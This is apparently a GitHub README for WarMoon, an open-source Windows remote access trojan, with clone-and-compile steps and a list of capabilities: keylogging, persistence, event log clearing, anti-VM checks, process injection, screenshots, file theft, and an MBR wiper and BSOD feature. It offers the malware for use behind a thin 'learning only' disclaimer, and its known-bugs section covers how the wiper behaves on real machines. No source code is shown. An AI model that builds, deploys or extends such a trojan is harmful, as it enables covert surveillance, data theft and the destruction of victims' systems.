# WarMoon
WarMoon is an open-source RAT, with a few custom functionalities for both 64/32 bit Windows systems.

![Server-Image](https://github.com/IvanT7D3/WarMoon/blob/5d1aeaef5ea907dddfb6af3ff408900f74efa49c/img.png)

# Setup:

1. Clone the repository:
```bash
git clone https://github.com/IvanT7D3/WarMoon
```

2. To install all requirements, execute Setup.sh, using the option 'install'
```bash
./Setup.sh install
```
3. If you want to generate a new certificate, use:
```bash
./Setup.sh cert
```

4. If you generated a new certificate, you must also modify the Client.c file, to include the new certificate. A certificate is already being used. This means that you don't necessarily have to create another certificate.

5. To compile, run:
```bash
./Setup.sh compile
```

6. All done. Enjoy!

## Versions
There are 2 versions of WarMoon: 64 and 32 bit.

If you are compiling against a target that uses a 64 bit system, go read the README file in the x64 folder for more info.

If you are compiling against a target that uses a 32 bit system, go read the README file in the x86 folder for more info.

If you want to use the outdated version, extract Outdated.7z, and read its README file.

## Capabilities
- [x] Execute Commands
- [x] Keylogger
- [x] Persistence
- [x] Fallback Shell
- [x] Clean Event Viewer
- [x] Basic Anti-VM Checks
- [x] Upload Files
- [x] Download Files
- [x] Screenshots
- [x] Process Injection
- [x] List Peripheral Devices
- [x] Get Disk Space
- [x] MBR Wiper And BSOD
- [x] TLS
- [ ] Hidden VNC

Things that can be added to improve the whole WarMoon project:
- [ ] Add GUI : Qt
- [ ] Add more functionalities : Proxy, privilege escalation, something else?
- [ ] Fix bugs : Read the section 'Known Bugs'

## Demo
Here's a link if you want to watch an outdated [Demo](https://www.youtube.com/watch?v=nErq4wlsF1g)

## License
This project can be freely modified and shared. Just don't damage systems without having explicit permission from the owner of such systems.

## Credits
This project wouldn't have been possible without the many open-source projects that are already out there, and from which I took inspiration!

## Disclaimer
This project was created with the only purpose of learning.

Feel free to understand how it works, modify and play around with it.

This software should only be used on machines that you have explicit permission to attack. You are solely responsible for what you do with this code.

## Known Bugs
This section tries to keep track of known bugs that were discovered.
I tried to fix as many as I could. If you find any other bug, feel free to let me know.

- If you use wipembr on a Windows 7 machine, the client will crash (the MBR will still be wiped). The crash doesn't seem to occur on Windows 10 machines.

- In some cases when running 'getfile' or 'screenshot', the file transfer might bug, and create an empty file with a strange name ($_'%237') or something like that. You can fix this by closing the program and running it again. In some other cases it fixed automatically after trying to re-run the command.

- If you do not have administrator privileges and you run 'startlogger' twice, the server will freeze and won't be able to send other commands.

This project was tested mainly on Windows 7 Ultimate and Windows 10. If you have found any other bug and would like to report it, feel free to email me at: ituser905649056ATprotonmail.com
